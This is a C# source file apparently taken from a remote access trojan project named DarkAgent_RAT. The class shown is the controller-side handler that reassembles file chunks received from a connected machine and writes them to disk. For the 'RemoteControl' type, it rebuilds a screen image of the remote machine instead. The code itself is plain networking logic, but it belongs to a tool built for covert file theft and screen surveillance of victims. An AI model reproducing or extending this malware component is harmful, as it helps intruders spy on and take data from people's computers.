using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using DarkAgent_RAT.src.Events;
using System.Drawing;
using System.Collections;

namespace DarkAgent_RAT.src.Network.FileServer.Packets.Receive
{
    class R_FileTransferEnd : ReceiveBasePacket
    {
        public R_FileTransferEnd(FileClients client, byte[] packet)
            : base(client, packet)
        {
        }

        private short Id;
        public override void Read()
        {
            Id = ReadShort();
        }

        public override void Run()
        {
            try
            {
                if (Client._FileTransfer.ContainsKey(Id))
                {
                    if(Client._FileTransfer[Id].type > 0)
                    {
                        using (BinaryWriter BW = new BinaryWriter(File.Open(Client._FileTransfer[Id].Destination + Client._FileTransfer[Id].FileName, FileMode.Append)))
                        {
                            for (int i = 0; i < Client._FileTransfer[Id].FileBytes.Count; i++)
                            {
                                //just a check again to see if we received everything..
                                //hopefully we received everything in a sync connection :)
                                if (Client._FileTransfer[Id].FileBytes.ContainsKey(i))
                                    BW.Write(Client._FileTransfer[Id].FileBytes[i]);
                            }
                            BW.Close();
                        }
                    }
                    else if(Client._FileTransfer[Id].type == -1) //RemoteControl
                    {
                        MemoryStream stream = new MemoryStream();
                        for (int i = 0; i < Client._FileTransfer[Id].FileBytes.Count; i++)
                        {
                            if (Client._FileTransfer[Id].FileBytes.ContainsKey(i))
                                stream.Write(Client._FileTransfer[Id].FileBytes[i], 0, Client._FileTransfer[Id].FileBytes[i].Length);
                        }

                        Image image = Image.FromStream(stream);
                        RemoteControlEventArgs e1 = new RemoteControlEventArgs(Client.RemoteEndPoint.ToString(), image);
                        RemoteControlEvent.OnRemoteControl(e1);
                    }
                    Client._FileTransfer.Remove(Id);
                }
            }
            catch
            {
                //Exception should only happen if we upload too fast our data about the file
            }
        }
    }
}
